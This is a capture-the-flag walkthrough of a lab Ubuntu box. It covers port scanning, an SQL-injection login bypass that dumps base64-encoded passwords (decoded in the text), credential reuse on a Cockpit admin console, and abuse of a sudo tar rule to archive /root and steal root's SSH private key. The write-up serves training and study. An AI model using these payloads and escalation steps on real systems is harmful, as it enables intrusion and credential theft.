---
machine: Cockpit
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [sql-injection, cockpit, sudo-tar-wildcard, ssh-key-theft]
date: 2026-08-06
status: retired
summary: An Ubuntu box running a system-administration web console alongside a small login portal — testing a classic SQL-injection authentication bypass to recover credentials, pivoting them into the admin console's built-in terminal, and abusing a wildcard-driven sudo rule around `tar` to exfiltrate root's SSH key.
---

## Enumeration

nmap scan:

```bash
└─$ nmap-full target
[*] Running fast port discovery on target...
[sudo] password for kali: 
[*] Open ports: 22,80,9090
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 17:28 -0400
Nmap scan report for target (192.168.240.10)
Host is up (0.066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://target:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.81 seconds
```

We see we have two webapps, one on port 80 and one on port 9090. The port 9090 one fails to redirect likely because we do not have the correct domain name in our /etc/hosts.

When we navigate to the port 9090 webapp via web browser we are brought to a login portal that says `Ubuntu 20.04.6 LTS` with options: User name, Password, and Connect to. SAt the bottom the portal says: `Server: blaze`

Inside the source code we find some potentially interesting javascript:

```javascript
var environment = {"page":{"connect":true,"require_host":false},"hostname":"blaze","os-release":{"NAME":"Ubuntu","ID":"ubuntu","PRETTY_NAME":"Ubuntu 20.04.6 LTS","ID_LIKE":"debian"}};
```

We feroxbust the 9090 webapp and find some references to the paths in the source code with /shell/ and /text/:

```text
http://target:9090/gnumeric-1
200      GET      544l     1999w    20790c http://target:9090/arrowDown
200      GET      585l     2164w    22178c http://target:9090/shell/20340
200      GET      439l     1612w    16626c http://target:9090/text/Eraser57Setup
200      GET      522l     1881w    19402c http://target:9090/003851
200      GET      700l     2899w    40222c http://target:9090/bsa
200      GET      248l      980w     9686c http://target:9090/text/audiograbber
200      GET      647l     2437w    26342c http://target:9090/text/entreprises
200      GET      647l     2451w    27730c http://target:9090/shell/7097
200      GET        0l        0w        0c http://target:9090/cat_flying
200      GET        0l        0w        0c http://target:9090/06techno
200      GET        0l        0w        0c http://target:9090/shell/whyer
200      GET      700l     2899w    40222c http://target:9090/n14810
200      GET      322l     1221w    12462c http://target:9090/promo_header
200      GET      485l     1741w    18014c http://target:9090/shell/000867
200      GET      647l     2473w    29118c http://target:9090/tit_products
200      GET      544l     1999w    20790c http://target:9090/shell/cpdea7
200      GET        0l        0w        0c http://target:9090/shell/datamarker11
200      GET      283l     1110w    11074c http://target:9090/shell/upload_v2
200      GET      647l     2473w    29118c http://target:9090/text/dhcp1
200      GET      647l     2473w    29118c http://target:9090/shell/posts_pr
200      GET      622l     2324w    23566c http://target:9090/text/smallone
200      GET      700l     2899w    40222c http://target:9090/text/page925
200      GET      700l     2899w    40222c http://target:9090/shell/fcraltr12
```

On port 80 if we add -x php to our feroxbust we find login.php.

## Foothold

If we enter a `'` into our username we can provoke this error:

```text
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%asfd%'' at line 1
```

We can use a sqli to close an argument and comment out everything after:

```text
admin' -- ## //
```

We get:

```text
|Username|Password|
|---|---|
|james|Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=|
|cameron|dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy|
```

We base64 decode for james and cameron respectively:

```text
canttouchhhthiss@455152
thisscanttbetouchedd@455152
```

We can input the creds for james into the User and Pass field on the port 9090 and we get transported to an admin dashboard for blaze. Inside the admin dashboard we can navigate to the Terminal session and find that we have a ssh session as james.

## Privilege Escalation

When we run `sudo -l` we see:

```bash
james@blaze:/tmp/root/.ssh$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

This is an interesting finding. We can run that specific command with any last argument. This essentially means we can pack a recursive arbitrary path into /tmp/backup.tar.gz

```bash
james@blaze:/tmp/root/.ssh$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /root
/usr/bin/tar: Removing leading `/' from member names
/root/
/root/.local/
/root/.local/share/
/root/.local/share/nano/
/root/snap/
/root/snap/lxd/
/root/snap/lxd/current
/root/snap/lxd/22753/
/root/snap/lxd/common/
/root/snap/lxd/24061/
/root/.bash_history
/root/.bashrc
/root/proof.txt
/root/flag2.txt
/root/.ssh/
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile
```

From here we can extract it and read the id_rsa (private key) and use it on our local machine to connect to root after `chmod 700`.

```bash
┌──(kali㉿kali)-[~/oscp/cockpit]
└─$ ssh -i priv root@target
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 06 Aug 2026 11:27:05 PM UTC

  System load:  0.05              Processes:               249
  Usage of /:   59.9% of 9.75GB   Users logged in:         1
  Memory usage: 42%               IPv4 address for ens160: 192.168.240.10
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

73 updates can be applied immediately.
3 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***
Web console: https://blaze.offsec:9090/

Last login: Thu Apr  6 06:51:29 2023
root@blaze:~# whoami
root
```

From here we can go to the /root directory and get the root flag.
